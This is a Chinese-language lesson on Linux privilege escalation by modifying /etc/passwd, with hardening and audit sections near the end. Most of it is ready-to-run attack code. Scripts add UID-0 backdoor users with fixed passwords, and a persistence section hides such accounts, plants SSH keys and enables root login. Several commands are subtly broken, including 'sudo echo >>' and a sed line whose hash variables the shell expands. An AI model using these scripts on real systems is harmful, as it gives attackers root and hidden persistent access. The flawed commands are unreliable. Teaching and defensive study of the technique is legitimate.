# 课时05 passwd提权

## 一、课程目标

本节课主要学习通过修改/etc/passwd文件实现提权的技术和方法。passwd提权是一种经典的Linux系统提权技术，虽然现代系统已有更强的安全防护，但在某些特定环境下仍然有效。通过本课的学习，你将能够：

1. 理解/etc/passwd文件的结构和作用
2. 掌握passwd文件提权的基本原理和方法
3. 学会在不同场景下利用passwd文件进行提权
4. 了解passwd提权的防护措施和检测方法
5. 熟悉相关的安全加固技术

## 二、名词解释表

| 名词 | 解释 |
|------|------|
| /etc/passwd | Linux系统中存储用户基本信息的文件 |
| /etc/shadow | Linux系统中存储用户密码哈希的文件 |
| UID | User ID，用户的唯一标识符 |
| GID | Group ID，用户组的唯一标识符 |
| Root权限 | Linux系统中的最高权限 |
| 影子文件 | 指/etc/shadow文件，用于存储加密密码 |
| 明文密码 | 未经过加密处理的原始密码 |
| 密码哈希 | 经过哈希算法处理的密码 |

## 三、技术原理

### 3.1 /etc/passwd文件概述

/etc/passwd是Linux系统中最重要的用户账户配置文件之一，包含了系统中所有用户的基本信息。

#### 文件结构
```bash
# /etc/passwd文件格式
username:password:UID:GID:GECOS:home_directory:shell
```

#### 字段说明
1. **username**：用户名
2. **password**：密码字段（现代系统中通常为"x"）
3. **UID**：用户ID
4. **GID**：组ID
5. **GECOS**：用户描述信息
6. **home_directory**：用户家目录
7. **shell**：用户登录shell

#### 示例
```bash
# /etc/passwd文件示例
root:x:0:0:root:/root:/bin/bash
daemon:*:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:*:2:2:bin:/bin:/usr/sbin/nologin
sys:*:3:3:sys:/dev:/usr/sbin/nologin
sync:*:4:65534:sync:/bin:/bin/sync
games:*:5:60:games:/usr/games:/usr/sbin/nologin
man:*:6:12:man:/var/cache/man:/usr/sbin/nologin
```

### 3.2 提权原理

#### 传统提权方法
在早期Unix/Linux系统中，/etc/passwd文件直接存储用户的密码哈希，攻击者可以通过以下方式提权：

1. 获取对/etc/passwd文件的写权限
2. 将目标用户的密码字段替换为已知密码的哈希
3. 使用新密码登录目标账户

#### 现代系统防护
现代Linux系统通过以下方式增强安全性：
- 使用影子文件（/etc/shadow）存储密码哈希
- /etc/passwd中的密码字段设置为"x"
- 严格的文件权限控制

#### 可利用场景
尽管现代系统加强了防护，但仍存在以下可利用场景：
1. 系统配置错误导致/etc/passwd可写
2. 具有sudo权限可以修改passwd文件
3. 存在SUID/SGID程序可以修改passwd文件
4. 容器环境中挂载了宿主机的/etc目录

### 3.3 哈希算法

#### DES哈希
```bash
# DES哈希格式（13个字符）
# salt(2) + hash(11)
john:xy.Hk9W/a1F1E:1001:1001::/home/john:/bin/bash
```

#### MD5哈希
```bash
# MD5哈希格式（34个字符）
# $1$salt$hash
alice:$1$salt$wP3mElJ/dEdzQxkjHKWql/:1002:1002::/home/alice:/bin/bash
```

#### SHA-256/SHA-512哈希
```bash
# SHA-512哈希格式
# $6$salt$hash
bob:$6$salt$IxDD3jeSOb5eB1CX5LBsqZFVkJdido3OUILO5Ifz5iwMuTSvXFNl.bsN8LXDqLJ0zQaO3SsrAqQxNgKz6Ck05.:1003:1003::/home/bob:/bin/bash
```

## 四、passwd文件操作

### 4.1 查看passwd文件

#### 基本查看命令
```bash
# 查看passwd文件内容
cat /etc/passwd

# 格式化显示
column -t -s: /etc/passwd

# 查看特定用户
grep "^username:" /etc/passwd

# 统计用户数量
wc -l /etc/passwd
```

#### 详细信息查看
```bash
# 使用getent查看用户信息
getent passwd
getent passwd username

# 使用id查看用户ID
id
id username

# 查看用户详细信息
finger username  # 需要安装finger包
```

### 4.2 passwd文件权限

#### 检查文件权限
```bash
# 查看passwd文件权限
ls -l /etc/passwd

# 输出示例：
# -rw-r--r-- 1 root root 1234 May 1 10:30 /etc/passwd

# 检查shadow文件权限
ls -l /etc/shadow

# 输出示例：
# -rw-r----- 1 root shadow 1234 May 1 10:30 /etc/shadow
```

#### 权限分析
- **正常权限**：/etc/passwd应为644，所有者为root
- **安全隐患**：如果普通用户有写权限，则存在提权风险
- **shadow权限**：应为640，组为shadow，防止普通用户读取密码哈希

### 4.3 备份和恢复

#### 备份passwd文件
```bash
# 备份passwd文件
sudo cp /etc/passwd /etc/passwd.backup.$(date +%Y%m%d)

# 备份shadow文件
sudo cp /etc/shadow /etc/shadow.backup.$(date +%Y%m%d)

# 验证备份
ls -l /etc/*.backup*
```

#### 恢复passwd文件
```bash
# 恢复passwd文件
sudo cp /etc/passwd.backup.date /etc/passwd

# 恢复shadow文件
sudo cp /etc/shadow.backup.date /etc/shadow

# 恢复文件权限
sudo chmod 644 /etc/passwd
sudo chmod 640 /etc/shadow
sudo chown root:root /etc/passwd
sudo chown root:shadow /etc/shadow
```

## 五、passwd提权方法

### 5.1 直接修改passwd文件

#### 创建root等效用户
```bash
# 1. 备份原始文件
cp /etc/passwd /tmp/passwd.bak

# 2. 创建密码哈希
# 使用openssl生成密码哈希
openssl passwd -1 "newpassword"
# 输出示例：$1$salt$hash

# 3. 添加新用户行
echo "newuser:$1$salt$hash:0:0:root:/root:/bin/bash" >> /etc/passwd

# 4. 验证添加结果
tail -1 /etc/passwd

# 5. 使用新用户登录
su - newuser
# 输入密码：newpassword
```

#### 修改现有用户
```bash
# 1. 查找目标用户
grep "^targetuser:" /etc/passwd

# 2. 生成新密码哈希
openssl passwd -1 "hackedpassword"

# 3. 替换用户密码字段
sed -i "s/^targetuser:[^:]*:/targetuser:$1$new$salt$hash:/" /etc/passwd

# 4. 验证修改
grep "^targetuser:" /etc/passwd

# 5. 使用新密码登录
su - targetuser
# 输入密码：hackedpassword
```

### 5.2 利用SUID程序

#### 可利用的SUID程序
```bash
# 查找可利用的SUID程序
find / -perm -4000 2>/dev/null | grep -E "(vim|nano|cp|mv)"

# 利用vim修改passwd文件
sudo vim /etc/passwd
# 在vim中添加用户行

# 利用cp覆盖passwd文件
echo "backdoor:x:0:0:root:/root:/bin/bash" > /tmp/passwd_mod
cat /etc/passwd >> /tmp/passwd_mod
sudo cp /tmp/passwd_mod /etc/passwd
```

#### 自定义利用脚本
```bash
#!/bin/bash
# passwd_exploit.sh - passwd文件利用脚本

# 检查权限
if [ ! -w /etc/passwd ]; then
    echo "[-] 没有写入/etc/passwd的权限"
    exit 1
fi

# 生成密码哈希
PASSWORD_HASH=$(openssl passwd -1 "exploit123")
echo "[+] 生成密码哈希: $PASSWORD_HASH"

# 创建后门用户
BACKDOOR_USER="backdoor_$(date +%s)"
echo "$BACKDOOR_USER:$PASSWORD_HASH:0:0:root:/root:/bin/bash" >> /etc/passwd
echo "[+] 添加后门用户: $BACKDOOR_USER"

# 验证添加
if grep -q "^$BACKDOOR_USER:" /etc/passwd; then
    echo "[+] 后门用户添加成功"
    echo "[+] 用户名: $BACKDOOR_USER"
    echo "[+] 密码: exploit123"
else
    echo "[-] 后门用户添加失败"
fi
```

### 5.3 利用sudo权限

#### sudo修改passwd文件
```bash
# 使用sudo权限修改passwd文件
sudo echo "hacker:x:0:0:root:/root:/bin/bash" >> /etc/passwd

# 或者使用tee命令
echo "hacker:x:0:0:root:/root:/bin/bash" | sudo tee -a /etc/passwd

# 使用sudo编辑器
sudo vim /etc/passwd
# 添加用户行
```

#### 条件性sudo利用
```bash
# 检查sudo权限
sudo -l | grep -E "(ALL|/bin/cat|/bin/cp|/usr/bin/vim)"

# 如果可以sudo cat文件
sudo cat /etc/passwd > /tmp/passwd_copy
echo "backdoor:x:0:0:root:/root:/bin/bash" >> /tmp/passwd_copy
sudo cp /tmp/passwd_copy /etc/passwd
```

## 六、自动化提权工具

### 6.1 passwd提权脚本

```bash
#!/bin/bash
# passwd_privilege_escalation.sh - passwd提权自动化脚本

echo "=== passwd提权检测工具 ==="
echo "检测时间: $(date)"
echo ""

# 检查passwd文件权限
check_passwd_permissions() {
    echo "1. 检查/etc/passwd文件权限:"
    PASSWD_PERMS=$(ls -l /etc/passwd | cut -d" " -f1)
    echo "   权限: $PASSWD_PERMS"
    
    # 检查是否可写
    if [ -w /etc/passwd ]; then
        echo "   [警告] /etc/passwd文件可写!"
        return 0
    else
        echo "   [/] /etc/passwd文件不可写"
        return 1
    fi
}

# 检查shadow文件权限
check_shadow_permissions() {
    echo "2. 检查/etc/shadow文件权限:"
    if [ -r /etc/shadow ]; then
        SHADOW_PERMS=$(ls -l /etc/shadow | cut -d" " -f1)
        echo "   权限: $SHADOW_PERMS"
        echo "   [注意] 可以读取shadow文件"
        return 0
    else
        echo "   [/] 无法读取shadow文件"
        return 1
    fi
}

# 检查sudo权限
check_sudo_permissions() {
    echo "3. 检查sudo权限:"
    if command -v sudo &> /dev/null; then
        sudo -l 2>/dev/null | grep -E "(ALL|passwd|shadow)" > /dev/null
        if [ $? -eq 0 ]; then
            echo "   [警告] 具有修改passwd/shadow的sudo权限"
            sudo -l 2>/dev/null | grep -E "(ALL|passwd|shadow)"
            return 0
        else
            echo "   [/] 没有相关sudo权限"
            return 1
        fi
    else
        echo "   [-] sudo命令不存在"
        return 1
    fi
}

# 检查SUID程序
check_suid_programs() {
    echo "4. 检查可利用的SUID程序:"
    VULNERABLE_SUID=("/usr/bin/vim" "/usr/bin/nano" "/bin/cp" "/bin/mv")
    for program in "${VULNERABLE_SUID[@]}"; do
        if [ -u "$program" ]; then
            echo "   [警告] 发现可利用SUID程序: $program"
        fi
    done
}

# 尝试提权
attempt_privilege_escalation() {
    echo "5. 尝试passwd提权:"
    
    # 如果可以直接写入passwd文件
    if [ -w /etc/passwd ]; then
        echo "   [+] 可以直接修改/etc/passwd文件"
        
        # 生成密码哈希
        PASSWORD_HASH=$(openssl passwd -1 "backdoor123" 2>/dev/null)
        if [ $? -eq 0 ]; then
            BACKDOOR_USER="bd_$(date +%s)"
            echo "$BACKDOOR_USER:$PASSWORD_HASH:0:0:root:/root:/bin/bash" >> /etc/passwd
            echo "   [+] 添加后门用户: $BACKDOOR_USER"
            echo "   [+] 密码: backdoor123"
        else
            echo "   [-] 无法生成密码哈希"
        fi
    fi
    
    # 检查sudo权限
    if sudo -l 2>/dev/null | grep -q "ALL"; then
        echo "   [+] 具有ALL sudo权限，可以修改passwd文件"
        # 可以在这里添加具体的sudo利用代码
    fi
}

# 主执行流程
main() {
    check_passwd_permissions
    echo ""
    check_shadow_permissions
    echo ""
    check_sudo_permissions
    echo ""
    check_suid_programs
    echo ""
    attempt_privilege_escalation
}

# 执行主函数
main
```

### 6.2 密码哈希生成工具

```bash
#!/bin/bash
# hash_generator.sh - 密码哈希生成工具

generate_hash() {
    local password=$1
    local algorithm=${2:-1}  # 默认使用MD5
    
    case $algorithm in
        1|md5)
            openssl passwd -1 "$password"
            ;;
        5|sha256)
            openssl passwd -5 "$password"
            ;;
        6|sha512)
            openssl passwd -6 "$password"
            ;;
        *)
            echo "支持的算法: 1(MD5), 5(SHA-256), 6(SHA-512)"
            return 1
            ;;
    esac
}

# 使用示例
echo "=== 密码哈希生成工具 ==="
echo "用法: $0 <密码> [算法]"
echo "算法: 1(MD5), 5(SHA-256), 6(SHA-512)"
echo ""

if [ $# -lt 1 ]; then
    echo "请输入密码"
    exit 1
fi

PASSWORD=$1
ALGORITHM=${2:-1}

echo "密码: $PASSWORD"
echo "算法: $ALGORITHM"
echo "哈希: $(generate_hash "$PASSWORD" "$ALGORITHM")"
```

## 七、权限维持

### 7.1 隐藏后门用户

#### 创建隐藏用户
```bash
# 创建隐藏用户名（以$结尾）
echo "hidden_user$:x:0:0:root:/root:/bin/bash" >> /etc/passwd

# 或者使用空格和特殊字符
echo " user:x:0:0:root:/root:/bin/bash" >> /etc/passwd

# 创建多个隐藏用户
for i in {1..5}; do
    USERNAME="sys_${i}_\$"
    HASH=$(openssl passwd -1 "hidden${i}")
    echo "$USERNAME:$HASH:0:0:root:/root:/bin/bash" >> /etc/passwd
done
```

#### 隐藏用户检测
```bash
# 检测隐藏用户
grep -E "^\s+|:\$" /etc/passwd

# 检测UID为0的用户
awk -F: '$3 == 0 {print}' /etc/passwd

# 检测异常用户名
grep -E "(\s+|[\$\*])" /etc/passwd
```

### 7.2 SSH后门

#### 添加SSH密钥
```bash
# 创建后门用户
BACKDOOR_USER="maintenance"
HASH=$(openssl passwd -1 "maint123")
echo "$BACKDOOR_USER:$HASH:0:0:root:/root:/bin/bash" >> /etc/passwd

# 添加SSH密钥
mkdir -p /root/.ssh
echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC..." >> /root/.ssh/authorized_keys
chmod 600 /root/.ssh/authorized_keys
chmod 700 /root/.ssh
```

#### SSH配置后门
```bash
# 修改SSH配置允许root登录
echo "PermitRootLogin yes" >> /etc/ssh/sshd_config
echo "AllowUsers *" >> /etc/ssh/sshd_config

# 重启SSH服务
systemctl restart sshd
```

## 八、防护措施

### 8.1 系统加固

#### 文件权限加固
```bash
# 设置正确的passwd文件权限
chmod 644 /etc/passwd
chown root:root /etc/passwd

# 设置正确的shadow文件权限
chmod 640 /etc/shadow
chown root:shadow /etc/shadow

# 设置正确的group文件权限
chmod 644 /etc/group
chown root:root /etc/group
```

#### 启用影子套件
```bash
# 检查是否启用了影子套件
ls -l /etc/shadow

# 如果没有shadow文件，启用影子套件
pwconv  # 将密码移到shadow文件
grpconv # 将组密码移到gshadow文件
```

### 8.2 监控和审计

#### 文件完整性监控
```bash
# 使用AIDE监控关键文件
apt-get install aide

# 初始化AIDE数据库
aide --init

# 配置监控规则
echo "/etc/passwd M" >> /etc/aide/aide.conf
echo "/etc/shadow M" >> /etc/aide/aide.conf

# 定期检查
aide --check
```

#### 日志监控
```bash
# 监控passwd文件修改
echo "-w /etc/passwd -p wa -k passwd_modification" >> /etc/audit/rules.d/passwd.rules

# 监控用户添加
echo "-a always,exit -F arch=b64 -S setuid -F auid>=1000 -F auid!=4294967295 -k setuid" >> /etc/audit/rules.d/user.rules

# 重启auditd服务
systemctl restart auditd
```

### 8.3 安全配置

#### 限制用户权限
```bash
# 禁止普通用户修改系统文件
# 在/etc/security/limits.conf中添加
# username hard nproc 10
# username hard nofile 100

# 使用PAM限制
# /etc/pam.d/common-account
account required pam_access.so
```

#### 定期安全检查
```bash
# 创建定期检查脚本
cat > /usr/local/bin/security_check.sh << 'EOF'
#!/bin/bash
# 安全检查脚本

echo "=== 系统安全检查 ==="
echo "检查时间: $(date)"
echo ""

# 检查passwd文件权限
echo "1. /etc/passwd文件权限:"
ls -l /etc/passwd

# 检查shadow文件权限
echo "2. /etc/shadow文件权限:"
ls -l /etc/shadow

# 检查UID为0的用户
echo "3. UID为0的用户:"
awk -F: '$3 == 0 {print}' /etc/passwd

# 检查最近添加的用户
echo "4. 最近添加的用户:"
tail -10 /etc/passwd
EOF

chmod +x /usr/local/bin/security_check.sh

# 添加到cron任务
echo "0 2 * * * /usr/local/bin/security_check.sh > /var/log/security_check.log" | crontab -
```

## 九、实战案例

### 9.1 passwd提权完整流程

#### 信息收集阶段
```bash
# 1. 检查passwd文件权限
ls -l /etc/passwd

# 2. 检查shadow文件权限
ls -l /etc/shadow

# 3. 检查sudo权限
sudo -l

# 4. 查找SUID程序
find / -perm -4000 2>/dev/null
```

#### 利用阶段
```bash
# 5. 如果可以直接写入passwd文件
if [ -w /etc/passwd ]; then
    # 生成密码哈希
    HASH=$(openssl passwd -1 "backdoor123")
    
    # 添加后门用户
    echo "backdoor:$HASH:0:0:root:/root:/bin/bash" >> /etc/passwd
    
    # 验证添加
    tail -1 /etc/passwd
    
    # 使用后门用户登录
    su - backdoor
    # 输入密码: backdoor123
fi
```

#### 权限验证
```bash
# 6. 验证提权成功
id
# 输出应该显示uid=0(root)

# 7. 执行特权操作
cat /etc/shadow
touch /root/test_file
```

### 9.2 复杂环境提权

#### 条件利用
```bash
# 1. 检查条件
# 如果具有sudo权限修改passwd文件
sudo -l | grep passwd

# 2. 利用sudo权限
if sudo -l 2>/dev/null | grep -q "/etc/passwd"; then
    HASH=$(openssl passwd -1 "complex123")
    echo "complex:$HASH:0:0:root:/root:/bin/bash" | sudo tee -a /etc/passwd
    
    # 验证
    sudo grep "^complex:" /etc/passwd
fi
```

## 十、故障排除

### 10.1 常见问题

#### 权限不足
```bash
# 检查当前权限
id
ls -l /etc/passwd

# 检查sudo权限
sudo -l

# 检查SUID程序
find / -perm -4000 2>/dev/null
```

#### 哈希生成失败
```bash
# 检查openssl是否安装
which openssl

# 安装openssl
sudo apt-get install openssl

# 使用替代方法生成哈希
# 使用python
python -c "import crypt; print(crypt.crypt('password', '\$1\$salt\$'))"

# 使用mkpasswd（如果安装了whois包）
mkpasswd -m sha-512 password
```

### 10.2 系统恢复

#### 恢复passwd文件
```bash
# 如果系统出现问题，恢复备份
sudo cp /etc/passwd.backup /etc/passwd
sudo cp /etc/shadow.backup /etc/shadow

# 恢复文件权限
sudo chmod 644 /etc/passwd
sudo chmod 640 /etc/shadow
sudo chown root:root /etc/passwd
sudo chown root:shadow /etc/shadow
```

#### 用户账户修复
```bash
# 如果用户账户损坏，使用系统工具修复
sudo pwck  # 检查密码文件
sudo grpck  # 检查组文件

# 重建用户数据库
sudo pwd_mkdb /etc/master.passwd  # FreeBSD
sudo mkpasswd  # 某些Linux发行版
```

## 十一、课后作业

1. **基础练习**：
   - 在实验环境中练习passwd文件操作
   - 学习不同哈希算法的生成方法
   - 练习passwd提权的基本方法
   - 验证提权结果并清理环境

2. **进阶练习**：
   - 编写自定义passwd提权脚本
   - 实现passwd文件监控工具
   - 配置系统防护措施
   - 研究容器环境中的passwd提权

3. **思考题**：
   - 现代Linux系统为什么不再直接在passwd文件中存储密码？
   - 如何在保证系统功能性的同时防止passwd提权？
   - passwd提权在容器环境中的特殊性是什么？

4. **扩展阅读**：
   - 研究影子套件（Shadow Suite）的实现原理
   - 了解PAM（Pluggable Authentication Modules）机制
   - 学习文件完整性监控技术